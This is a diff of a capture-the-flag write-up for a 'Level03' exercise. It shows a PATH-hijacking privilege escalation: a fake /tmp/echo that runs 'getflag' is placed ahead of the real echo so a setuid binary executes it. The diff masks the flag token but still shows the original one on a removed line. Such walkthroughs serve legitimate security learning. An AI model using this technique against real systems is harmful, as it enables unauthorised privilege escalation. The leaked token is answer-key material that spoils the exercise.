@@ -1,4 +1,6 @@
-## Exploring the exercice
+# Level03
+
+## Exploring the computer
 
 ```bash 
 $ ls -la
@@ -33,7 +35,6 @@ $ echo "/bin/sh -c 'getflag'" > /tmp/echo
 $ chmod 755 /tmp/echo
 ```
 
-
 ```bash
 $ export PATH=/tmp:$PATH
 ```
@@ -46,9 +47,11 @@ I make sure that tmp has been added to the path :
 $ which echo 
 /tmp/echo
 ```
+Okay our echo has taken over the 'normal' one
 
-And finally 
+## Getting the flag
+
 ```bash
 $ ./level03 
-Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+Check flag.Here is your token : ******************
 ```
